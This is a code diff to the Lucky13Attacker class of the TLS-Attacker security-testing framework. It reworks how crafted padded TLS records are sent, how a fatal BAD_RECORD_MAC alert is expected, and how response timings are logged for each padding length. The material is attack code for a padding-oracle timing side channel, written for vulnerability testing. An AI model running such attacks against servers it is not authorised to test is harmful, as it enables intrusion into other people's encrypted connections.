@@ -10,7 +10,10 @@ package de.rub.nds.tlsattacker.attacks.impl;
 
 import de.rub.nds.tlsattacker.attacks.config.Lucky13CommandConfig;
 import de.rub.nds.tlsattacker.core.config.Config;
+import de.rub.nds.tlsattacker.core.constants.AlertDescription;
+import de.rub.nds.tlsattacker.core.constants.AlertLevel;
 import de.rub.nds.tlsattacker.core.constants.RunningModeType;
+import de.rub.nds.tlsattacker.core.protocol.message.ProtocolMessage;
 import de.rub.nds.tlsattacker.core.record.AbstractRecord;
 import de.rub.nds.tlsattacker.core.state.State;
 import de.rub.nds.tlsattacker.core.workflow.action.ReceiveAction;
@@ -94,24 +97,30 @@ public class Lucky13Attacker extends Attacker<Lucky13CommandConfig> {
         //TlsContext tlsContext = configHandler.initializeTlsContext(config);
         tlsConfig.getDefaultClientConnection().setTransportHandlerType(TransportHandlerType.TCP_PROXY_TIMING);
         // TODO: test wether or not the correct TransportHandlerType will be chosen
-        TlsContext tlsContext = new TlsContext(tlsConfig);
+        tlsConfig.setWorkflowExecutorShouldClose(true);
+        //TlsContext tlsContext = new TlsContext(tlsConfig);
 
         WorkflowTrace trace = new WorkflowConfigurationFactory(tlsConfig).createWorkflowTrace(
-                WorkflowTraceType.HANDSHAKE, RunningModeType.CLIENT);
-
+                WorkflowTraceType.FULL, RunningModeType.CLIENT);
         //WorkflowTrace trace = tlsContext.getWorkflowTrace();
 
-        ApplicationMessage applicationMessage = new ApplicationMessage();
-        SendAction sendAction = (new SendAction(applicationMessage));
+        SendAction sendAction = (SendAction) trace.getLastSendingAction();
         LinkedList<AbstractRecord> records = new LinkedList<>();
         records.add(record);
         sendAction.setRecords(records);
         //applicationMessage.addRecord(record);
-        trace.addTlsAction(sendAction);
+        //trace.addTlsAction(sendAction);
 
-        AlertMessage alertMessage = new AlertMessage();
-        ReceiveAction receiveAction = (new ReceiveAction(alertMessage));
-        trace.addTlsAction(receiveAction);
+        ReceiveAction action = new ReceiveAction();
+
+        AlertMessage alertMessage = new AlertMessage(tlsConfig);
+        alertMessage.setDescription(AlertDescription.BAD_RECORD_MAC.getValue());
+        alertMessage.setLevel(AlertLevel.FATAL.getValue());
+        //ReceiveAction action = (ReceiveAction) (trace.getLastReceivingAction());
+        List<ProtocolMessage> messages = new LinkedList<>();
+        messages.add(alertMessage);
+        action.setExpectedMessages(messages);
+        trace.addTlsAction(action);
 
         //trace.getProtocolMessages().add(applicationMessage);
         //trace.getProtocolMessages().add(alertMessage);
@@ -126,12 +135,15 @@ public class Lucky13Attacker extends Attacker<Lucky13CommandConfig> {
         } catch (WorkflowExecutionException ex) {
             LOGGER.info("Not possible to finalize the defined workflow: {}", ex.getLocalizedMessage());
         }
+
         //tlsContexts.add(tlsContext);
         //TimingProxyClientTcpTransportHandler transportHandler = (TimingProxyClientTcpTransportHandler) workflowExecutor.getTransportHandler();
         TimingProxyClientTcpTransportHandler transportHandler = (TimingProxyClientTcpTransportHandler) state.getTlsContext().getTransportHandler();
         lastResult = transportHandler.getLastMeasurement();
         try{transportHandler.closeConnection();}
-        catch (IOException e){}
+        catch (IOException e){
+            LOGGER.warn(e.getMessage());
+        }
     }
 
     private Record createRecordWithPadding(int p) {
@@ -146,14 +158,26 @@ public class Lucky13Attacker extends Attacker<Lucky13CommandConfig> {
         return createRecordWithPlainData(plain);
     }
 
-    private Record createRecordWithPlainData(byte[] plain) {
+    private Record OLDcreateRecordWithPlainData(byte[] plain) {
         Record r = new Record();
         ModifiableByteArray plainData = new ModifiableByteArray();
         VariableModification<byte[]> modifier = ByteArrayModificationFactory.explicitValue(plain);
         plainData.setModification(modifier);
         // TODO: test if plain record bytes are actually set accordingly
         //r.setPlainRecordBytes(plainData);
-        r.setCompleteRecordBytes(plainData);
+        //r.setCompleteRecordBytes(plainData);
+        //r.setProtocolMessageBytes(plainData);
+        r.setFragment(plainData);
+        return r;
+    }
+
+    private Record createRecordWithPlainData(byte[] plain) {
+        Record r = new Record();
+        r.prepareComputations();
+        ModifiableByteArray plainData = new ModifiableByteArray();
+        VariableModification<byte[]> modifier = ByteArrayModificationFactory.explicitValue(plain);
+        plainData.setModification(modifier);
+        r.getComputations().setPlainRecordBytes(plainData);
         return r;
     }
 
@@ -178,6 +202,7 @@ public class Lucky13Attacker extends Attacker<Lucky13CommandConfig> {
                 Record record = createRecordWithPadding(p);
                 //record.setMeasuringTiming(true);
                 executeAttackRound(record);
+                LOGGER.info("Padding: {}, Measured {}",p,lastResult);
                 if (results.get(p) == null) {
                     results.put(p, new LinkedList<Long>());
                 }
